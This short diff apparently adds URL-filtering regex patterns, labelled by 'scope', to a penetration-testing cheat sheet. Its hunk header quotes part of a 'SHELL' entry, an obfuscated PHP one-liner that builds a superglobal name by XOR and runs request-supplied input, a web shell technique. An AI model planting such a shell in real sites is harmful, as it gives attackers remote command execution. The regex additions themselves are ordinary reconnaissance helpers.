@@ -33,3 +33,16 @@ SHELL = {`<?php $_="{";$_=($_^"<").($_^">;").($_^"/");?><?=${'_'.$_}["_"](${'_'.
 
 ###### Scope : view all / | x.php/aspx | x.php/aspx?x=x | /?x=x
 `([a-z_.-][?-][a-z0-9+$%_.-])?`
+
+###### Scope : only view .php / .aspx / .js / .json
+`([a-zA-Z0-9-_.]+[.]+[a-z]{2,4}$)`
+
+###### Scope : only view .php?id=...etc / .aspx?id=12&name=foo
+`([a-zA-Z0-9-_.]+[\S]+[?$])`
+
+###### Scope : only view end with /
+`([a-zA-Z0-9-_.]+[/]$)`
+
+
+
+
